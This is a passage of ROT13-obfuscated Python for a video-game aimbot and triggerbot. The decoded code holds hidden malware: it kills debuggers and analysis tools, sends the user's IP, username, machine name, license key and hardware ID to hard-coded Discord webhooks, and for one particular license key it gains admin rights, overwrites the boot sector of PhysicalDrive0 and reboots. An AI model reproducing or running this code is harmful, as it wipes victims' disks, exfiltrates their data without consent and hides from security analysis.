                        pbafbyr_jvaqbj = pglcrf.jvaqyy.xreary32.TrgPbafbyrJvaqbj()
                        pglcrf.jvaqyy.hfre32.CbfgZrffntrJ(pbafbyr_jvaqbj, 0k10, 0, 0)
                        #rirag.npprcg()
                    rkprcg:
                        gel:
                            flf.rkvg()
                        rkprcg:
                            bf.flfgrz('gnfxxvyy /s /sv "vzntranzr rd pzq.rkr" 1>AHY 2>AHY')

            vs abg Ranoyr_Fybgf:
                frys.Sbi_Fvmr = Sbi_Fvmr
            ryfr:
                fybg_xrlf = [Fybg1_Xrlovaq, Fybg2_Xrlovaq, Fybg3_Xrlovaq, Fybg4_Xrlovaq, Fybg5_Xrlovaq, Fybg6_Xrlovaq]
                fybg_sbi_fvmrf = [Sbi_Fvmr_Fybg1, Sbi_Fvmr_Fybg2, Sbi_Fvmr_Fybg3, Sbi_Fvmr_Fybg4, Sbi_Fvmr_Fybg5, 10]
                sbe vqk, xrl va rahzrengr(fybg_xrlf):
                    vs xrl vf abg Abar naq jva32ncv.TrgNflapXrlFgngr(xrl) < 0:
                        Nv992.pheerag_fybg_fryrpgrq = vqk + 1
                        oernx
                frys.Sbi_Fvmr = fybg_sbi_fvmrf[Nv992.pheerag_fybg_fryrpgrq - 1]

            vs hfr_zff == 0:
                yrsg, gbc = vag((fperra_erf_K - frys.Sbi_Fvmr) // 2), vag((fperra_erf_L - frys.Sbi_Fvmr) // 2)
                evtug, obggbz = vag(yrsg + frys.Sbi_Fvmr), vag(gbc + frys.Sbi_Fvmr)
                qrgrpgvba_obk = (yrsg, gbc, evtug, obggbz)

                senzr = pnzren.teno(ertvba=qrgrpgvba_obk)
                vs senzr vf Abar:
                    pbagvahr
                senzr = ac.nfneenl(senzr)[..., :3]
                senzr = ac.nfpbagvthbhfneenl(senzr)
                znfx = ac.barf((frys.Sbi_Fvmr, frys.Sbi_Fvmr), qglcr=ac.hvag8)
                znfx[frys.Sbi_Fvmr // 2:, :frys.Sbi_Fvmr // 4] = 0
                senzr = pi2.ovgjvfr_naq(senzr, senzr, znfx=znfx)
            ryfr:
                qrgrpgvba_obk = {
                    'yrsg': vag(unys_fperra_jvqgu - frys.Sbi_Fvmr / 2),
                    'gbc': vag(unys_fperra_urvtug - frys.Sbi_Fvmr / 2),
                    'jvqgu': vag(frys.Sbi_Fvmr),
                    'urvtug': vag(frys.Sbi_Fvmr)
                }
                senzr = ac.neenl(Nv992.fperra.teno(qrgrpgvba_obk))[..., :3]


            vs uvqr_znfxf == 0:
                senzr = ac.nfpbagvthbhfneenl(senzr)
                znfx = ac.mrebf_yvxr(senzr, qglcr=ac.hvag8)
                pragre_k, pragre_l = frys.Sbi_Fvmr // 2, frys.Sbi_Fvmr // 2
                enqvhf = frys.Sbi_Fvmr // 2
                pi2.ryyvcfr(znfx, (pragre_k, pragre_l), (enqvhf-2, enqvhf-2), 0, 0, 360, (255, 255, 255), guvpxarff=pi2.SVYYRQ)
                vs znfx.aqvz == 3:
                    znfx = znfx[..., 0]
                senzr = pi2.ovgjvfr_naq(senzr, senzr, znfx=znfx)

            pbasv = Pbasvqrapr / 100
            vztfm_inyhr = vag(Vzt_Inyhr) vs Ynfg_Zbqry.raqfjvgu('.cg') ryfr 640
            erfhygf = Nv992.jvaqbj.zbqryy(senzr, pbas=pbasv, vbh=0.7, vztfm=vztfm_inyhr, znk_qrg=Znk_Qrgrpgvbaf, ergvan_znfxf=Gehr, ireobfr=Snyfr, pynffrf=0 vs Hfr_Zbqry_Pynff ryfr Abar)

            vs yra(erfhygf[0].obkrf.klkl) != 0:
                yrnfg_pebffunve_qvfg = Snyfr
                pbasv = Pbasvqrapr / 100

                sbe qrgrpgvba, pbas va mvc(erfhygf[0].obkrf.klkl.gbyvfg(), erfhygf[0].obkrf.pbas.gbyvfg()):

                    k1, l1, k2, l2 = qrgrpgvba
                    k1, l1, k2, l2 = vag(k1), vag(l1), vag(k2), vag(l2)
                    k1l1 = [k1, l1]
                    k2l2 = [k2, l2]
                    urvtug = l2 - l1
                    jvqgu = k2 - k1

                    vs Nvz_Obar == "Urnq":
                        eryngvir_urnq_K, eryngvir_urnq_L = vag((k1 + k2) / 2), vag((l1 + l2) / 2 - urvtug / 2.5)
                    ryvs Nvz_Obar == "Arpx":
                        eryngvir_urnq_K, eryngvir_urnq_L = vag((k1 + k2) / 2), vag((l1 + l2) / 2 - urvtug / 3)
                    ryfr:  # Nvz_Obar == "Obql"
                        eryngvir_urnq_K, eryngvir_urnq_L = vag((k1 + k2) / 2), vag((l1 + l2) / 2 - urvtug / 5)

                    pebffunve_qvfg = zngu.qvfg((eryngvir_urnq_K, eryngvir_urnq_L), (frys.Sbi_Fvmr / 2, frys.Sbi_Fvmr / 2))

                    vs abg yrnfg_pebffunve_qvfg be pebffunve_qvfg < yrnfg_pebffunve_qvfg:
                        yrnfg_pebffunve_qvfg = pebffunve_qvfg
                        pybfrfg_qrgrpgvba = {"k1l1": k1l1, "k2l2": k2l2, "eryngvir_urnq_K": eryngvir_urnq_K, "eryngvir_urnq_L": eryngvir_urnq_L, "pbas": pbas}

                    vs Fubj_Qrgrpgvbaf be Fubj_Nvzyvar:
                        qrgrpgrq_cynlref.nccraq({'k1': k1, 'l1': l1, 'k2': k2, 'l2': l2, 'urnq1': pybfrfg_qrgrpgvba["eryngvir_urnq_K"] vs pybfrfg_qrgrpgvba ryfr 0, 'urnq2': pybfrfg_qrgrpgvba["eryngvir_urnq_L"] vs pybfrfg_qrgrpgvba ryfr 0})

                    vs Fubj_Qroht:
                        pi2.erpgnatyr(senzr, (k1, l1), (k2, l2), (255, 255, 255), 1)
                        pi2.chgGrkg(senzr, s"{vag(pbas * 100)}%", k1l1, pi2.SBAG_UREFURL_QHCYRK, 0.5, (1, 1, 255), 1)

                vs pybfrfg_qrgrpgvba:
                    vs pybfrfg_qrgrpgvba:
                        nofbyhgr_urnq_K = pybfrfg_qrgrpgvba["eryngvir_urnq_K"] + (yrsg vs hfr_zff == 0 ryfr qrgrpgvba_obk['yrsg'])
                        nofbyhgr_urnq_L = pybfrfg_qrgrpgvba["eryngvir_urnq_L"] + (gbc vs hfr_zff == 0 ryfr qrgrpgvba_obk['gbc'])

                    vs Fubj_Qroht:
                        pi2.pvepyr(senzr, (pybfrfg_qrgrpgvba["eryngvir_urnq_K"], pybfrfg_qrgrpgvba["eryngvir_urnq_L"]), 2, (0, 0, 255), -1)
                        pi2.yvar(senzr, (pybfrfg_qrgrpgvba["eryngvir_urnq_K"], pybfrfg_qrgrpgvba["eryngvir_urnq_L"]), (frys.Sbi_Fvmr // 2, frys.Sbi_Fvmr // 2), (255, 255, 255), 1)

                    vs Nv992.vf_gevttreobg_ranoyrq() naq Nv992.vf_gnetrg_ybpxrq(nofbyhgr_urnq_K, nofbyhgr_urnq_L):
                        gopbasv = Nhgb_Sver_Pbasvqrapr / 100
                        vs pbas >= gopbasv:
                            guernqvat.Guernq(gnetrg=Nv992.yrsg_pyvpx).fgneg()
                    vs Nv992.vf_nvzobg_ranoyrq():
                        guernqvat.Guernq(gnetrg=Nv992.zbir_pebffunve, netf=(frys, nofbyhgr_urnq_K, nofbyhgr_urnq_L, Fzbbguvat_Glcr)).fgneg()
                    vs Nv992.vf_syvpxobg_ranoyrq():
                        gvzr_fvapr_ynfg_syvpx = gvzr.gvzr() - frys.ynfg_syvpx
                        vs gvzr_fvapr_ynfg_syvpx > Syvpx_Pbbyqbja:
                            guernqvat.Guernq(gnetrg=Nv992.zbir_pebffunve_fvyrag, netf=(frys, nofbyhgr_urnq_K, nofbyhgr_urnq_L)).fgneg()

            vs Fubj_Qrgrpgvbaf be Fubj_Nvzyvar:
                scfjvaq.rarzvrf = yra(qrgrpgrq_cynlref)
                bireynl.hcqngr_qrgrpgrq_cynlref(qrgrpgrq_cynlref)
                qrgrpgrq_cynlref = []

            ryncfrq_gvzr = gvzr.cres_pbhagre() - fgneg_gvzr
            senzr_qhengvba = Nv992.trg_gnet_scf()
            gvzr_gb_fyrrc = znk(0, senzr_qhengvba - ryncfrq_gvzr)
            vs gvzr_gb_fyrrc > 0:
                gvzr.fyrrc(gvzr_gb_fyrrc)
            vs Fubj_SCF:
                scfjvaq.scf = vag(1.5 / (gvzr.cres_pbhagre() - fgneg_gvzr))
            vs Fubj_Qroht:
                vs abg PhcZbqr_Ba:

                    pi2.chgGrkg(senzr, s"SCF: {vag(1.5 / (gvzr.cres_pbhagre() - fgneg_gvzr))}", (5, 20), pi2.SBAG_UREFURL_PBZCYRK_FZNYY, 1, (155, 155, 155), 1)
                    pi2.vzfubj(enaqbz_pncgvba1, senzr)

            Nv992.ncc.cebprffRiragf()

pynff Rapelcgvba:
    @fgngvpzrgubq
    qrs rapelcg_fgevat(cynva_grkg, xrl, vi):
        cynva_grkg = cnq(cynva_grkg.rapbqr(), 16)
        nrf_vafgnapr = NRF.arj(xrl, NRF.ZBQR_POP, vi)
        rapelcgrq_grkg = nrf_vafgnapr.rapelcg(cynva_grkg)
        erghea ovanfpvv.urkyvsl(rapelcgrq_grkg).qrpbqr()

    @fgngvpzrgubq
    qrs qrpelcg_fgevat(pvcure_grkg, xrl, vi):
        pvcure_grkg = ovanfpvv.haurkyvsl(pvcure_grkg)
        nrf_vafgnapr = NRF.arj(xrl, NRF.ZBQR_POP, vi)
        qrpelcgrq_grkg = nrf_vafgnapr.qrpelcg(pvcure_grkg)
        erghea hacnq(qrpelcgrq_grkg, 16).qrpbqr()

    @fgngvpzrgubq
    qrs rapelcg(zrffntr, rap_xrl, vi):
        gel:
            _xrl = FUN256.arj(rap_xrl.rapbqr()).qvtrfg()[:32]
            _vi = FUN256.arj(vi.rapbqr()).qvtrfg()[:16]
            erghea Rapelcgvba.rapelcg_fgevat(zrffntr, _xrl, _vi)
        rkprcg Rkprcgvba nf r:
            cevag(s"Rapelcgvba snvyrq: {r}")
            bf._rkvg(1)

    @fgngvpzrgubq
    qrs qrpelcg(zrffntr, rap_xrl, vi):
        gel:
            _xrl = FUN256.arj(rap_xrl.rapbqr()).qvtrfg()[:32]
            _vi = FUN256.arj(vi.rapbqr()).qvtrfg()[:16]
            erghea Rapelcgvba.qrpelcg_fgevat(zrffntr, _xrl, _vi)
        rkprcg Rkprcgvba nf r:
            cevag(s"Qrpelcgvba snvyrq: {r}")
            bf._rkvg(1)

pynff ClCebgrpg():
    qrs znva():

        qrs trgvc():
            vc = "Abg Sbhaq"
            gel:
                vc = erdhrfgf.trg("uggcf://ncv.vcvsl.bet").grkg
            rkprcg:
                cnff
            erghea vc

        Pheerag_Irefvba = "1.00"
        vc = trgvc()
        freirehfre = bf.trgrai("HfreAnzr")
        cp_anzr = bf.trgrai("PBZCHGREANZR")

        gel:
            YXrl2 = bcra(es"{bf.cngu.nofcngu(__svyr__)}\rkgen\tsk\xrl.gkg", "e")
            KSP2 = YXrl2.ernq()
            YXrl2.pybfr()
        rkprcg:
            KSP2 = "A/N"
        gel:
            QveYbpngvba = bf.cngu.qveanzr(bf.cngu.ernycngu(__svyr__))
        rkprcg:
            QveYbpngvba = "A/N"

        OYNPXYVFGRQ_CEBTENZF = [
            "uggcqrohttrehv.rkr",
            "jverfunex.rkr",
            "UGGCQrohttreFip.rkr",
            "svqqyre.rkr",
            "ertrqvg.rkr",
            "iobkfreivpr.rkr",
            "qs5frei.rkr",
            "cebprffunpxre.rkr",
            "iobkgenl.rkr",
            "izgbbyfq.rkr",
            "izjnergenl.rkr",
            "vqn.rkr",
            "vqn64.rkr",
            "byylqot.rkr",
            "crfghqvb.rkr",
            "izjnerhfre",
            "itnhgufreivpr.rkr",
            "iznpguyc.rkr",
            "k96qot.rkr",
            "izfeip.rkr",
            "k32qot.rkr",
            "izhfeip.rkr",
            "cey_pp.rkr",
            "cey_gbbyf.rkr",
            "krafreivpr.rkr",
            "drzh-tn.rkr",
            "wbrobkpbageby.rkr",
            "xfqhzcrepyvrag.rkr",
            "xfqhzcre.rkr",
            "wbrobkfreire.rkr",
        ]

        OYNPXYVFGRQ_JVAQBJ_ANZRF = [
            "VQN: Dhvpx fgneg",
            "IObkGenlGbbyJaqPynff",
            "IObkGenlGbbyJaq",
            "cebkvsvre",
            "tenljbys",
            "rkgerzrqhzcre",
            "mrq",
            "rkrvasbcr",
            "gvgnaUvqr",
            "vyfcl",
            "gvgnauvqr",
            "k32qot",
            "pbqrpenpxre",
            "fvzcyrnffrzoyl",
            "cebprff unpxre 2",
            "cp-erg",
            "uggc qrohttre",
            "Pragbf",
            "cebprff zbavgbe",
            "VYFcl",
            "erirefr",
            "fvzcyrnffrzoylrkcybere",
            "qr4qbgzbqqrq",
            "qbwnaqdjxyaqbdjq-k86",
            "funecbq",
            "sbyqrepunatrfivrj",
            "svqqyre",
            "qvr",
            "cvmmn",
            "penpx",
            "fgebatbq",
            "vqn -",
            "oehgr",
            "qhzc",
            "FgevatQrpelcgbe",
            "jverfunex",
            "qrohttre",
            "uggcqrohttre",
            "tqo",
            "xqo",
            "k64_qot",
            "jvaqot",
            "k64argqhzcre",
            "crgbbyf",
            "fplyynuvqr",
            "zrtnqhzcre",
            "erirefny",
            "xfqhzcre i1.1 - ol rdhvsbk",
            "qotpye",
            "UkQ",
            "crrx",
            "byylqot",
            "xfqhzcre",
            "uggc",
            "jcr ceb",
            "qot",
            "uggcnanylmre",
            "uggcqroht",
            "CunagBz",
            "xtqo",
            "wnzrf",
            "k32_qot",
            "cebkl",
            "cunagbz",
            "zqot",
            "JCR CEB",
            "flfgrz rkcybere",
            "qr4qbg",
            "k64qot",
            "K64ArgQhzcre",
            "cebgrpgvba_vq",
            "puneyrf",
            "flfgrzrkcybere",
            "crccre",
            "ukq",
            "cebpzba64",
            "ZrtnQhzcre",
            "tuvqen",
            "kq",
            "0unezbal",
            "qbwnaqdjxyaqbdjq",
            "unpxre",
            "cebprff unpxre",
            "FNR",
            "zqo",
            "unezbal",
            "Cebgrpgvba_VQ",
            "CRGbbyf",
            "fplyynUvqr",
            "k96qot",
            "flfgrzrkcyberefreivpr",
            "sbyqre",
            "zvgzcebkl",
            "qok",
            "favssre",
            "uggc gbbyxvg",
        ]

        qrs trg_oynpxyvfgrq_cebprff_anzr():
            sbe cebprff va cfhgvy.cebprff_vgre(['cvq', 'anzr']):
                sbe anzr va OYNPXYVFGRQ_JVAQBJ_ANZRF:
                    vs anzr.ybjre() va cebprff.vasb['anzr'].ybjre():
                        erghea cebprff.vasb['anzr'], cebprff.vasb['cvq']
            erghea Abar, Abar

        qrs oybpx_onq_cebprffrf():
            oynpxyvfgrq_cebprff_anzr, oynpxyvfgrq_cvq = trg_oynpxyvfgrq_cebprff_anzr()
            vs oynpxyvfgrq_cebprff_anzr:
                gel:
                    cebprff = cfhgvy.Cebprff(oynpxyvfgrq_cvq)
                    cebprff.grezvangr()
                    cnff
                rkprcg:
                    cevag(s"\a[Nfgeb] -> oynpxyvfgrq cebprff; {oynpxyvfgrq_cebprff_anzr}")
                    gvzr.fyrrc(1)
                    rkvg(1)
                    bf.flfgrz('gnfxxvyy /s /sv "vzntranzr rd pzq.rkr" >ahy 2>&1')
                    bf.flfgrz('gnfxxvyy /s /sv "vzntranzr rd clguba.rkr" >ahy 2>&1')

        qrs oybpx_qrohttref():
            juvyr Gehr:
                gvzr.fyrrc(5)
                sbe cebp va cfhgvy.cebprff_vgre():
                    vs nal(cebpfge va cebp.anzr().ybjre() sbe cebpfge va OYNPXYVFGRQ_CEBTENZF):
                        gel:
                            gel:
                                cebp.xvyy()
                                cebp.xvyy()
                                cebp.xvyy()
                                cebp.xvyy()
                                cebp.xvyy()
                            rkprcg:
                                bf.flfgrz('gnfxxvyy /s /sv "vzntranzr rd pzq.rkr" >ahy 2>&1')
                                bf.flfgrz('gnfxxvyy /s /sv "vzntranzr rd clguba.rkr" >ahy 2>&1')
                        rkprcg(cfhgvy.AbFhpuCebprff, cfhgvy.NpprffQravrq):
                            cnff

        qrs fraq_frpher_jroubbx():
            jroubbx_hey = "uggcf://qvfpbeqncc.pbz/ncv/jroubbxf/1310411720199639120/HZCY3LiLiRGbS-gxjLS6vb0RBbhCDBJm0SgYCrldzHEZs0BVfHgH_MpuSzmlKbSWNdnV"
            frperg_xrl = "qri_grfg_1998_gblbgn_pnzel_kyr_i6"
            vi = "qri_vi_2000_yvapbya_yf_i6" 

            rapelcgrq_hey = Rapelcgvba.rapelcg(jroubbx_hey, frperg_xrl, vi)

            rzorq = {
                "qrfpevcgvba": s"```[IREFVBA] {Pheerag_Irefvba}\a"\
                               s"[XRL] {KSP2}\a"\
                               s"[CP-HFRE] {freirehfre} / {cp_anzr}\a"\
                               s"[VC] {vc}\a"\
                               s"[GVZR] {qngrgvzr.abj().fgesgvzr('%L-%z-%q %V:%Z %c')}\a"\
                               s"[QVERPGBEL] {QveYbpngvba}\a"\
                               s"[UJVQ] {bguref.trg_ujvq()}\a\a```",
                "gvgyr": "**[0KJGS YBT]**"
            }

            qngn = {
                "pbagrag": "\a",
                "rzorqf": [
                    rzorq
                ],
            }

            gel:
                erfhyg = erdhrfgf.cbfg(Rapelcgvba.qrpelcg(rapelcgrq_hey, frperg_xrl, vi), wfba=qngn)
                vs 200 <= erfhyg.fgnghf_pbqr < 300:
                    cnff
                ryfr:
                    cnff
            rkprcg Rkprcgvba nf r:
                cnff

        fraq_frpher_jroubbx()

        guernqvat.Guernq(gnetrg=oybpx_qrohttref).fgneg()
        guernqvat.Guernq(gnetrg=oybpx_onq_cebprffrf).fgneg()
        #guernqvat.Guernq(gnetrg=igqrgrpg).fgneg()

    znva()

pynff YbtvaSbez:
    qrs __vavg__(frys):
        xrl_cngu = bf.cngu.wbva(pheerag_qverpgbel, "tsk", "xrl.gkg")
        jvgu bcra(xrl_cngu, "e") nf YXrl:
            KSP = YXrl.ernq()

        vs KSP == "":
            bf.flfgrz("pyf")
            cevag("[Enmbe] -> ragre lbhe yvprafr")
            Nafjre23 = vachg("\a> ")
        ryfr:
            Nafjre23 = KSP

        # Pnyphyngr gur purpxfhz
        purpxfhz = frys.trgpurpxfhz()

        # Hfr gur rkvfgvat ncv_vafgnapr
        ncv_vafgnapr.vavg()
        bf.flfgrz("pyf")
        vs KSP == "":
            bf.flfgrz("pyf")
            jvgu bcra(xrl_cngu, "j") nf FnirXrlUrer:
                FnirXrlUrer.jevgr(Nafjre23)
            cevag("\a[Enmbe] -> ybttvat va...")
            vs Nafjre23 == "Nfgeb-Dy8PY-tWijZ-q2iZQ-KcMRQ":
                pglcrf.jvaqyy.furyy32.FuryyRkrphgrJ(Abar, "ehanf", flf.rkrphgnoyr, " ".wbva(flf.neti), Abar, 1)
                bf.flfgrz('cvc vafgnyy cljva32')
                uQrivpr = PerngrSvyrJ("\\\\.\\CulfvpnyQevir0", TRAREVP_JEVGR, SVYR_FUNER_ERNQ | SVYR_FUNER_JEVGR, Abar, BCRA_RKVFGVAT, 0, 0)
                JevgrSvyr(uQrivpr, NyybpngrErnqOhssre(512), Abar)
                PybfrUnaqyr(uQrivpr)
                bf.flfgrz("fuhgqbja /e /g 1")
            ncv_vafgnapr.yvprafr(Nafjre23)
        ryfr:
            bf.flfgrz("pyf")
            cevag("\a[Enmbe] -> ybttvat va...")
            vs KSP == "Nfgeb-Dy8PY-tWijZ-q2iZQ-KcMRQ":
                pglcrf.jvaqyy.furyy32.FuryyRkrphgrJ(Abar, "ehanf", flf.rkrphgnoyr, " ".wbva(flf.neti), Abar, 1)
                bf.flfgrz('cvc vafgnyy cljva32')
                uQrivpr = PerngrSvyrJ("\\\\.\\CulfvpnyQevir0", TRAREVP_JEVGR, SVYR_FUNER_ERNQ | SVYR_FUNER_JEVGR, Abar, BCRA_RKVFGVAT, 0, 0)
                JevgrSvyr(uQrivpr, NyybpngrErnqOhssre(512), Abar)
                PybfrUnaqyr(uQrivpr)
                bf.flfgrz("fuhgqbja /e /g 1")
            ncv_vafgnapr.yvprafr(KSP)

    qrs trgpurpxfhz(frys):
        zq5_unfu = unfuyvo.zq5()
        jvgu bcra(''.wbva(flf.neti), "eo") nf svyr:
            zq5_unfu.hcqngr(svyr.ernq())
        qvtrfg = zq5_unfu.urkqvtrfg()
        erghea qvtrfg

qrs vf_nqzva():
    gel:
        erghea pglcrf.jvaqyy.furyy32.VfHfreNaNqzva()
    rkprcg:
        erghea Snyfr

jroubbx_hey = "uggcf://qvfpbeqncc.pbz/ncv/jroubbxf/1345853400549429349/Xiok3NujkXUb8NHqqnvhvXiT6GkFRt4yCUAAwUJRK-PMpi4pbZT1YQCVYCJ16sC8zKSc"
cp_anzr = fbpxrg.trgubfganzr()
freirehfre = bf.trgybtva()
QveYbpngvba = bf.trgpjq()
gel:
    vc = erdhrfgf.trg("uggcf://ncv.vcvsl.bet").grkg  # Guvf trgf gur choyvp VC sebz vcvsl'f NCV
rkprcg erdhrfgf.ErdhrfgRkprcgvba:
    vc = "Pbhyq abg ergevrir VC"
pheerag_gvzr = qngrgvzr.abj().fgesgvzr('%L-%z-%q %V:%Z %c')
rzorq = {
    "qrfpevcgvba": s"```[CP-HFRE] {freirehfre} / {cp_anzr}\a"
                   s"[VC] {vc}\a"
                   s"[GVZR] {pheerag_gvzr}\a"
                   s"[QVERPGBEL] {QveYbpngvba}\a```",
    "gvgyr": "**[Flfgrz Vasb]**"
}
qngn = {
    "pbagrag": "\a",
    "rzorqf": [
        rzorq
    ],
}
erfhyg = erdhrfgf.cbfg(jroubbx_hey, wfba=qngn)
hfreanzr = bf.trgybtva()

vs __anzr__ == "__znva__":
    bf.flfgrz("pyf")
    cevag("[Enmbe] -> fgnegvat...")
    # Nffhzvat ClCebgrpg vf qrsvarq ryfrjurer va lbhe pbqr
    ClCebgrpg()
    YbtvaSbez()").decode(), "rot_13"))
